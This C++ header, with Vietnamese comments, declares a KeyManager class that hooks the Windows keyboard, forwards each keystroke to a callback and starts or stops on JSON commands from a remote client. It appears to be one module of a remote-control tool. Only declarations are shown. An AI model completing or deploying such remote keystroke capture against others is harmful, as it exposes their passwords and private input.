// KeyManager.hpp
#pragma once
#include <string>
#include <functional>
#include <windows.h>
#include <thread>
#include <nlohmann/json.hpp>

using json = nlohmann::json;

// Định nghĩa kiểu hàm callback: nhận vào 1 chuỗi ký tự (phím vừa nhấn)
using KeyCallback = std::function<void(std::string key_char)>;

class KeyManager {
public:
    // Thiết lập hàm xử lý khi có phím nhấn (để gửi về Main)
    static void set_callback(KeyCallback cb);

    // Bắt đầu theo dõi bàn phím
    void start_hook();

    // Dừng theo dõi
    void stop_hook();

    std::string get_module_name() const { return "KEYBOARD"; }

    // Hàm xử lý lệnh từ Client (Start/Stop)
    json handle_command(const json& request);

private:
    // Thread để chạy vòng lặp tin nhắn
    std::thread hookThread;
};